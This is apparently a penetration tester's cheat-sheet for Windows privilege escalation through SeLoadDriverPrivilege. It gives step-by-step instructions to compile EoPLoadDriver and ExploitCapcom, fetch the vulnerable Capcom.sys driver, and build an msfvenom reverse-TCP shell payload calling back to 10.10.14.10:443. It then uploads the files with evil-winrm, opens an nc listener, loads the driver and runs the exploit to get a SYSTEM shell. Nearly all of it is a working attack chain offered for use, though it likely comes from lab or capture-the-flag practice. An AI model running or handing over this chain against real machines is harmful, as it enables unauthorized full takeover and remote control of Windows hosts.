---
title: "SeLoadDriverPrivilege"
date: 2024-7-18
tags: ["SeLoadDriverPrivilege", "privesc", "Windows", "Backup Operators", "diskshadow", "secretsdump"]
---

---
### SeLoadDriverPrivilege

#### Compile eoploaddriver

[eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)

```bash
1. Open Visual Studio 2022
2. Create a new project
3. Project Template : C++ Console App
4. Project Name     : Eoploaddriver
5. Replace code     : eoploaddriver.cpp
6. Remove header    : `include "stdafx.h"`
7. Release -> x64
8. Build   -> Build Solution
9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.exe
```

#### Download Capcom.sys

[Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

#### Compile ExploitCapcom

[ExploitCapcom](https://github.com/tandasat/ExploitCapcom/tree/master/ExploitCapcom)

```bash
1. Double click ExploitCapcom.sln
2. Replace the payload to `TCHAR CommandLine[] = TEXT("C:\\Windows\\Tasks\\rev.exe");`
3. Release -> x64
4. Build   -> Build Solution
5. Exported to .\x64\Release\ExploitCapcom.exe
```

#### Create stageless payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o rev.exe
```

#### Upload

```powershell
# For example (evil-winrm)
upload Eoploaddriver.exe C:\Windows\Tasks\Eoploaddriver.exe
```

```powershell
upload Capcom.sys C:\Windows\Tasks\Capcom.sys
```

```powershell
upload ExploitCapcom.exe C:\Windows\Tasks\ExploitCapcom.exe
```

```powershell
upload rev.exe C:\Windows\Tasks\rev.exe
```

#### Exploit

```bash
# Open a nc listener
rlwrap nc -lvnp 443
```

```powershell
C:\Windows\Tasks\Eoploaddriver.exe System\CurrentControlSet\test C:\Windows\Tasks\Capcom.sys
```

```powershell
C:\Windows\Tasks\ExploitCapcom.exe
```

<br>